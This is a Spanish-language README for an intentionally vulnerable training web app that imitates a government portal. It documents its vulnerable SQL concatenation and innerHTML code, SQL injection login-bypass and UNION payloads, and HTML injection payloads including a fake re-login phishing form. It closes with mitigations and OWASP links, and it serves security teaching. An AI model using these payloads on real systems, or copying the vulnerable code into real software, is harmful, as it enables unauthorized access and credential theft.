# 🦅 GOV-PORTAL — Laboratorio de Seguridad Web Educativo

> **⚠️ ADVERTENCIA:** Esta aplicación contiene vulnerabilidades **intencionales**.  
> Está diseñada **exclusivamente** para demostraciones educativas en entornos locales y aislados.  
> **NUNCA** desplegar en producción ni en redes públicas.

---

## 📋 Descripción

**GOV-PORTAL** es una aplicación web ficticia que simula un portal gubernamental de acceso a información clasificada. Contiene dos vulnerabilidades implementadas deliberadamente:

| Vulnerabilidad | Ubicación | Descripción |
|---|---|---|
| **SQL Injection** | Formulario de Login | Consultas construidas por concatenación directa de strings |
| **HTML Injection** | Bitácora de Comentarios | Contenido almacenado y renderizado sin sanitización |

---

## 🗂️ Estructura del Proyecto

```
vuln-lab/
├── frontend/
│   ├── index.html          # Página principal
│   ├── login.html          # Formulario de login (SQLi vulnerable)
│   ├── confidential.html   # Página protegida (HTML Injection)
│   ├── styles.css          # Estilos globales
│   └── scripts.js          # Lógica de frontend
├── backend/
│   ├── app.py              # Servidor Flask (vulnerable)
│   └── requirements.txt    # Dependencias Python
├── database/
│   └── init.sql            # Esquema y datos de prueba
├── Dockerfile              # Imagen Docker del backend
├── docker-compose.yml      # Orquestación de servicios
├── wait-for-db.sh          # Script de espera para BD
├── .env                    # Variables de entorno
└── README.md               # Este archivo
```

---

## 🚀 Instalación y Ejecución en Fedora Linux

### Prerrequisitos

```bash
# Instalar Docker y Docker Compose en Fedora
sudo dnf install -y docker docker-compose-plugin

# Iniciar y habilitar el servicio Docker
sudo systemctl start docker
sudo systemctl enable docker

# (Opcional) Agregar tu usuario al grupo docker para no usar sudo
sudo usermod -aG docker $USER
newgrp docker
```

### Levantar el proyecto

```bash
# 1. Clonar o descomprimir el proyecto
cd vuln-lab/

# 2. Construir y levantar todos los servicios
docker compose up --build

# Para ejecutar en segundo plano (detached):
docker compose up --build -d

# Ver logs en tiempo real (si está en detached):
docker compose logs -f
```

### Verificar que está corriendo

```bash
# Ver contenedores activos
docker compose ps

# Salida esperada:
# govportal_db   postgres:16-alpine   Up (healthy)   0.0.0.0:5432->5432/tcp
# govportal_web  vuln-lab-web         Up             0.0.0.0:5000->5000/tcp
```

### Acceder a la aplicación

Abre tu navegador en: **http://localhost:5000**

### Detener el proyecto

```bash
# Detener sin borrar datos
docker compose down

# Detener Y borrar el volumen de PostgreSQL (reset completo)
docker compose down -v
```

---

## 👤 Credenciales de Prueba (sin inyección)

| Usuario | Contraseña | Rol |
|---|---|---|
| `admin` | `admin123` | superadmin |
| `agent47` | `s3cr3t_007` | agente |
| `director` | `G0v2024!` | director |

---

## 💉 CASOS DE PRUEBA — SQL Injection

### ¿Cómo funciona la vulnerabilidad?

El backend construye la query de autenticación así:

```python
# ⚠️ CÓDIGO VULNERABLE (backend/app.py)
query = (
    "SELECT * FROM usuarios "
    "WHERE username = '" + username + "' "
    "AND password = '" + password + "'"
)
```

Un atacante puede romper la estructura SQL al insertar comillas y operadores SQL en los campos.

---

### 🧪 Caso 1 — Bypass clásico con comentario SQL (`--`)

**Objetivo:** Autenticarse como `admin` sin conocer su contraseña.

| Campo | Valor |
|---|---|
| **Usuario** | `admin' --` |
| **Contraseña** | *(cualquier valor, ej: `x`)* |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = 'admin' --' AND password = 'x'
```

**Explicación:**  
La cadena `--` inicia un comentario en SQL. Todo lo que sigue (incluyendo la condición `AND password = ...`) es ignorado por el motor de base de datos. La consulta solo verifica que exista el usuario `admin`, sin validar la contraseña.

**Resultado esperado:** Acceso concedido como `admin`.

---

### 🧪 Caso 2 — Bypass con OR siempre verdadero

**Objetivo:** Autenticarse sin conocer ningún usuario ni contraseña.

| Campo | Valor |
|---|---|
| **Usuario** | `' OR '1'='1' --` |
| **Contraseña** | *(cualquier valor)* |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = '' OR '1'='1' --' AND password = 'x'
```

**Explicación:**  
La condición `OR '1'='1'` siempre es verdadera. La base de datos devuelve el **primer usuario** de la tabla. El comentario `--` elimina la verificación de contraseña.

**Resultado esperado:** Acceso concedido como el primer usuario de la tabla (`admin`).

---

### 🧪 Caso 3 — Bypass con OR en ambos campos

**Objetivo:** Hacer que ambas condiciones sean verdaderas sin datos reales.

| Campo | Valor |
|---|---|
| **Usuario** | `' OR 1=1 --` |
| **Contraseña** | `' OR 1=1 --` |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = '' OR 1=1 --' AND password = '' OR 1=1 --'
```

**Explicación:**  
`1=1` es siempre verdadero. La consulta retorna todos los registros y el sistema autentica al primero.

---

### 🧪 Caso 4 — Autenticarse como usuario específico sin contraseña

**Objetivo:** Acceder como `director` sin conocer su contraseña.

| Campo | Valor |
|---|---|
| **Usuario** | `director' --` |
| **Contraseña** | `irrelevante` |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = 'director' --' AND password = 'irrelevante'
```

**Resultado esperado:** Acceso concedido con rol `director`.

---

### 🧪 Caso 5 — Inyección que provoca error SQL (enumeración)

**Objetivo:** Obtener información sobre la estructura de la base de datos a través del mensaje de error.

| Campo | Valor |
|---|---|
| **Usuario** | `'` *(solo una comilla)* |
| **Contraseña** | `x` |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = ''' AND password = 'x'
```

**Explicación:**  
La comilla sin cerrar genera un error de sintaxis SQL. La aplicación **expone el mensaje de error y la query completa** en la respuesta JSON, dando información valiosa al atacante sobre la estructura de la consulta.

**Resultado esperado:** Error 400 con el mensaje de PostgreSQL y la query visible en pantalla.

---

### 🧪 Caso 6 — Inyección con UNION (extracción de datos)

> **Nota:** Para explotar UNION en el login, primero hay que identificar el número de columnas. Esta tabla tiene 5 columnas (id, username, password, rol, creado_en).

| Campo | Valor |
|---|---|
| **Usuario** | `' UNION SELECT 1,'hacker','pass','admin','2024-01-01' --` |
| **Contraseña** | `x` |

**Query resultante:**
```sql
SELECT * FROM usuarios
WHERE username = '' UNION SELECT 1,'hacker','pass','admin','2024-01-01' --' AND password = 'x'
```

**Explicación:**  
El `UNION SELECT` agrega una fila artificial al resultado. La aplicación autentica esta fila ficticia y la sesión queda abierta con los datos inventados.

---

## 🖼️ CASOS DE PRUEBA — HTML Injection

### ¿Cómo funciona la vulnerabilidad?

El frontend inserta el contenido directamente como `innerHTML`:

```javascript
// ⚠️ CÓDIGO VULNERABLE (frontend/scripts.js)
`<div class="html-injection-zone">${c.contenido_html}</div>`
```

El backend guarda el contenido sin sanitizar. Al recuperarlo, cualquier etiqueta HTML es interpretada por el navegador.

---

### 🧪 Caso 1 — Encabezados HTML con estilos

**Payload:**
```html
<h1 style="color:red; text-align:center;">🚨 SISTEMA COMPROMETIDO 🚨</h1>
<h2 style="color:orange;">Acceso no autorizado detectado</h2>
<p style="font-size:18px; color:#ff6600;">
  Este mensaje fue <strong>inyectado</strong> mediante HTML Injection.
</p>
<hr style="border:3px dashed red;" />
```

**Comportamiento esperado:** Se renderiza un encabezado rojo grande con texto de alerta.  
**Por qué funciona:** Las etiquetas `<h1>`, `<h2>`, `<p>` y `<hr>` con atributos `style` son HTML estándar que el navegador interpreta directamente al asignarse como `innerHTML`.

---

### 🧪 Caso 2 — Imagen desde URL externa

**Payload:**
```html
<div style="text-align:center; padding:10px;">
  <p style="color:orange; font-weight:bold;">Imagen inyectada desde URL externa:</p>
  <img src="https://picsum.photos/500/200?random=99"
       alt="Inyectada"
       style="border:4px solid red; border-radius:10px; max-width:100%;" />
</div>
```

**Comportamiento esperado:** Se muestra una imagen cargada desde un servidor externo.  
**Por qué funciona:** La etiqueta `<img src="...">` hace una petición HTTP al servidor externo. Esto puede usarse para rastrear usuarios o para ataques de DNS rebinding.

---

### 🧪 Caso 3 — Video HTML5 embebido

**Payload:**
```html
<div style="text-align:center; background:#111; padding:15px; border-radius:8px;">
  <p style="color:#00ff88; font-weight:bold;">📹 Video inyectado:</p>
  <video width="480" controls autoplay muted
         style="border:2px solid #00ff88; border-radius:8px; max-width:100%;">
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
    Tu navegador no soporta video HTML5.
  </video>
</div>
```

**Comportamiento esperado:** Se reproduce automáticamente un video embebido en el comentario.  
**Por qué funciona:** La etiqueta `<video controls>` con `autoplay` y `muted` reproduce el video sin interacción del usuario.

---

### 🧪 Caso 4 — iFrame que carga página externa

**Payload:**
```html
<div style="padding:10px;">
  <p style="color:#bf00ff; font-weight:bold;">🖼️ iFrame inyectado — carga una web externa:</p>
  <iframe
    src="https://example.com"
    width="100%"
    height="350"
    style="border:3px solid purple; border-radius:8px; display:block;"
    title="Página externa inyectada">
  </iframe>
</div>
```

**Comportamiento esperado:** Se renderiza una página web externa dentro del comentario.  
**Por qué funciona:** Los iframes cargan contenido de terceros. En ataques reales, pueden usarse para cargar formularios de phishing o contenido malicioso camuflado dentro de la página legítima.

---

### 🧪 Caso 5 — Formulario falso de re-autenticación (phishing simulado)

**Payload:**
```html
<div style="background:#1a0a0a; border:2px solid #ff0066;
            border-radius:10px; padding:20px; max-width:400px; margin:auto;">
  <h3 style="color:#ff0066; margin-top:0;">🔐 Sesión expirada — Re-autenticación requerida</h3>
  <p style="color:#ccc; font-size:13px;">
    Por seguridad, ingresa tus credenciales para continuar.
  </p>
  <label style="color:#aaa; display:block; margin-top:12px; font-size:13px;">Usuario:</label>
  <input type="text" placeholder="Tu usuario"
    style="width:100%; padding:9px; margin:4px 0 10px;
           background:#0d0d0d; color:white; border:1px solid #ff0066; border-radius:5px;" />
  <label style="color:#aaa; display:block; font-size:13px;">Contraseña:</label>
  <input type="password" placeholder="Tu contraseña"
    style="width:100%; padding:9px; margin:4px 0 14px;
           background:#0d0d0d; color:white; border:1px solid #ff0066; border-radius:5px;" />
  <button onclick="alert('Demo educativo: Las credenciales habrían sido capturadas.')"
    style="width:100%; padding:10px; background:#ff0066; color:white;
           border:none; border-radius:5px; font-weight:bold; cursor:pointer;">
    Verificar identidad
  </button>
</div>
```

**Comportamiento esperado:** Aparece un formulario de login falso dentro de la bitácora.  
**Por qué funciona:** La HTML Injection permite insertar formularios completos dentro del DOM. En un escenario real, el `action` del formulario podría apuntar a un servidor del atacante para capturar credenciales.

---

### 🧪 Caso 6 — Tabla HTML dinámica

**Payload:**
```html
<div style="overflow-x:auto; padding:10px;">
  <h3 style="color:#00d4aa;">📊 Datos inyectados en tabla HTML</h3>
  <table style="width:100%; border-collapse:collapse; color:#ddd; font-size:14px;">
    <thead>
      <tr style="background:#003333;">
        <th style="border:1px solid #00d4aa; padding:9px;">ID</th>
        <th style="border:1px solid #00d4aa; padding:9px;">Agente</th>
        <th style="border:1px solid #00d4aa; padding:9px;">Misión</th>
        <th style="border:1px solid #00d4aa; padding:9px;">Estado</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td style="border:1px solid #1a3333; padding:8px; text-align:center;">001</td>
        <td style="border:1px solid #1a3333; padding:8px;">Agente ALFA</td>
        <td style="border:1px solid #1a3333; padding:8px;">Operación Sombra</td>
        <td style="border:1px solid #1a3333; padding:8px; color:#00d4aa;">ACTIVO</td>
      </tr>
      <tr>
        <td style="border:1px solid #1a3333; padding:8px; text-align:center;">002</td>
        <td style="border:1px solid #1a3333; padding:8px;">[REDACTADO]</td>
        <td style="border:1px solid #1a3333; padding:8px;">Operación Fénix</td>
        <td style="border:1px solid #1a3333; padding:8px; color:#ff8c00;">EN CAMPO</td>
      </tr>
    </tbody>
  </table>
</div>
```

**Comportamiento esperado:** Se renderiza una tabla completamente funcional con estilos CSS personalizados.  
**Por qué funciona:** Las etiquetas `<table>`, `<thead>`, `<tbody>`, `<tr>`, `<td>` son HTML estándar renderizado por el navegador sin ningún procesamiento adicional.

---

### 🧪 Caso 7 — Elemento marquee y estilos de página

**Payload:**
```html
<div style="background:black; color:lime; font-family:monospace; padding:15px; border-radius:8px;">
  <marquee style="font-size:1.4em; font-weight:bold;">
    ⚠️  ATENCIÓN: Este sistema ha sido comprometido  ⚠️
  </marquee>
  <br/>
  <p>Demostración de HTML Injection — etiqueta &lt;marquee&gt; funcionando.</p>
  <p>Posibilidades: cambiar el aspecto de la página, insertar contenido falso,
     engañar a usuarios o crear formularios de phishing.</p>
</div>
```

**Comportamiento esperado:** Aparece un texto en movimiento horizontal (marquee) con apariencia de terminal.  
**Por qué funciona:** `<marquee>` es una etiqueta HTML (aunque obsoleta) que los navegadores modernos aún soportan. Demuestra que cualquier elemento HTML puede inyectarse.

---

## 🔧 Comandos útiles de diagnóstico

```bash
# Ver logs del backend Flask
docker compose logs web -f

# Ver logs de PostgreSQL
docker compose logs db -f

# Acceder a la BD con psql
docker exec -it govportal_db psql -U gov_user -d usa_gov_db

# Consultas útiles dentro de psql
\dt                                    # Listar tablas
SELECT * FROM usuarios;                # Ver usuarios
SELECT * FROM comentarios;             # Ver comentarios inyectados
SELECT * FROM documentos_confidenciales;  # Ver documentos

# Reconstruir solo el backend (tras cambios en app.py)
docker compose up --build web

# Reset completo de la BD
docker compose down -v && docker compose up --build
```

---

## 🛡️ Mitigaciones (para el análisis educativo posterior)

Una vez completada la demostración, estas son las correcciones que se aplicarían en una aplicación segura:

### SQL Injection → Consultas Parametrizadas

```python
# ✅ CÓDIGO SEGURO:
query = "SELECT * FROM usuarios WHERE username = %s AND password = %s"
cur.execute(query, (username, password))
```

### HTML Injection → Escape + Sanitización

```javascript
// ✅ En JavaScript, usar textContent en vez de innerHTML:
element.textContent = contenido;  // Escapa automáticamente

// ✅ O sanitizar con una librería como DOMPurify:
element.innerHTML = DOMPurify.sanitize(contenido);
```

```python
# ✅ En Flask, usar Jinja2 con auto-escape (activo por defecto):
# {{ variable }}         → escapa HTML automáticamente
# {{ variable | safe }}  → NO usar con input de usuarios
```

---

## 📚 Referencias educativas

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

*Proyecto educativo de ciberseguridad — Solo para uso en entornos locales y controlados.*
